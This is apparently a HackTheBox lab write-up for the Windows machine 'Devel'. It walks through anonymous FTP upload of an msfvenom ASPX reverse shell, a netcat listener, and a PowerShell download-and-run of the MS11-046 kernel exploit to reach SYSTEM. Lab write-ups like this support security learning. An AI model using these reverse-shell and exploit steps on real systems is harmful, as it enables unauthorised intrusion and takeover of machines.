# Devel - HackTheBox

![devel](https://miro.medium.com/max/585/1*8iyp7DABILVAi5WxwjGkzQ.png)

### Enumeration

#### Nmap

```
nmap -T4 -sC -sV 10.10.10.5

21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
```

#### FTP / Port 21

Anonymous access to the FTP server is allowed. Let's try to connect to it :

```
ftp 10.10.10.5
USER : anonymous
Password : <empty>

ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
```

We retrieve the present files with the `get` command :

```
ftp> get iistart.htm
ftp> get welcome.png
```

There are 2 directories under `aspnet_client` and one called `system_web`. There are empty.

It seems that this FTP Server contains the content of the Web Server.

#### Web Server / Port 80

By visiting the website, we have at the root, the image `welcome.png` that we has on the FTP server.

We were right, the FTP server hosts the website content.

#### Reverse Shell

As anonymous, we have the rights to upload files to the root of the FTP Server.

Let's upload a ASPX reverse shell :

```
git clone https://github.com/borjmz/aspx-reverse-shell
```

Edit the `shell.aspx` file with your local IP and port.

We can also use 'msfvenom' to generate a payload :

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f aspx > shell.aspx
```

Upload the reverse shell :

```
ftp 10.10.10.5
User : anonymous
password : <empty>

ftp> put shell.aspx
```

Start a netcat listener on the specified port :

```
nc -lnvp 1234
```

And visit the website to run the reverse shell :

```
http://10.10.10.5/shell.aspx
```

We have a shell as `iis apppool\web` !

### Privilege Escalation

We don't have access to the users' directories (Babis & Administrator).

Let's check the System information :

```
systeminfo
```

The machine is a Windows 7 Enterprise Build 7600.

Let's check if there is some exploits for this version.

We find an exploit : https://www.exploit-db.com/exploits/40564

Copy it :

```
searchsploit -m 40564.c
```

Compile it following the instructions in the file :

```
i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
```

Start a Web Server using Python3 :

```
python3 -m http.server 7777
```

On the Windows machine, download the exploit :

```
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8:7777/MS11-046.exe', 'c:\Users\Public\Downloads\exploit.exe')"
```

Once downloaded, run it :
```
exploit.exe

c:\Windows\System32>whoami
nt authority\system
```

We are administrator of the machine, we can get the user flag in `C:\Users\babis\Desktop\user.txt.txt` and the root flag in `C:\Users\Administrator\Desktop\root.txt` !
